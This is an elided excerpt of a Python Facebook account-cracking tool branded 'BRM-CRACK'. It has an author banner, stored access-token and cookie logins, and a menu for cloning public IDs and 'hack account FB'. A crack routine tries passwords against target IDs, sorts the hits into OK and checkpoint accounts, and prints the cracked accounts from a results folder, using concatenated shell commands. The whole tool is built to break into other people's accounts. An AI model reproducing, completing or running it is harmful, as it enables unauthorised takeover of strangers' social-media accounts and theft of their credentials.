...
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'BRM','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'BRM','10':'Oktober','11':'November','12':'Desember'}
###########################################################################################
...
def banner():
	...
	print("""\n
\033[1;36m   /$$$$$$$  /$$$$$$ /$$   /$$  /$$$$$$   /$$$$$$  /$$   /$$
\033[1;32m  | $$__  $$|_  $$_/| $$  /$$/ /$$__  $$ /$$__  $$| $$  | $$
\033[1;34m  | $$  \ $$  | $$  | $$ /$$/ | $$  \ $$| $$  \__/| $$  | $$
\033[1;31m  | $$$$$$$   | $$  | $$$$$/  | $$$$$$$$|  $$$$$$ | $$$$$$$$
\033[1;34m  | $$__  $$  | $$  | $$  $$  | $$__  $$ \____  $$| $$__  $$
\033[1;36m  | $$  \ $$  | $$  | $$\  $$ | $$  | $$ /$$  \ $$| $$  | $$
\033[1;31m  | $$$$$$$/ /$$$$$$| $$ \  $$| $$  | $$|  $$$$$$/| $$  | $$
\033[1;37m  |_______/ |______/|__/  \__/|__/  |__/ \______/ |__/  |__/
                                                          
		\033[1;88m----------------------------------------------
\033[1;84m Author    : LAHUREY DON
\033[1;84m Github    : BIKASH-BRAND
\033[1;84m Facebook  : BIKASH MAGAR
\033[1;84m Tool Name : BRM FILE CLONING 
\033[1;84m Type type : FREE
\033[1;84m Version   : 1.0
\033[1;84m----------------------------------------------
 BIKASH PRO VERSION 1.0
 FEEL THE POWER OF BIKASH x HERO(⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def login():
	try:
		token = open('tokBRM.txt','r').read()
		cok = open('cokBRM.txt','r').read()
...
def login_lagi334():
	try:
		...
		ken = open("tokBRM.txt", "w").write(tok)
		cok = open("cokBRM.txt", "w").write(cookie)
		print(f'{x}[{h}•{x}]{h} Good LOGIN python BRM-CRACK.py !{x} ');time.sleep(1)
		os.system("python BRM-CRACK.py")
		exit()
	except Exception as e:
		os.system('rm -rf cokBRM.txt && rm -rf tokBRM.txt')
		login_lagi334()
# MENU
...
def menu(my_id):
	...
	id = "5145769736"
	BRM = """	\033[1;31m[01] CLONE ID PUBLIC
		\033[1;31m[02] CLONE ID PUBLIC (MULTI)
		\033[1;37m[03] CLONE BRM HACK ACCOUNT FB
	...
	if jh in ['1','01']:
		...
		os.system("xdg-open  https://t.me/BRM4x")
		os.system("python BRM-CRACK.py")
	elif jh in ['6','06']:
		...
		os.system('rm -rf tokBRM.txt')
		os.system('rm -rf cokBRM.txt')
		print(x+'['+h+'•'+x+'] Wait ...')
		time.sleep(1)
		sw = ' LOGOUT '
		os.system("python BRM-CRACK.py")
...
def result():
	...
	cetak(nel(kis, title='BRM-HACK'))
	kz = input(x+'['+p+'BRM'+x+'] CHOOICE : ')
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:lin = open('OK/'+geh,'r').read()
				...
				time.sleep(2)
				back()
			akun = '# BRM YOUR OK ACCOUNT'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# BRM YOUR OK ACCOUNT'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] LOGOUT ')
			back()
	elif kz in ['0','00']:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s[BRM] %s/%s OK:%s CP:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='BRM-OK'))
					break
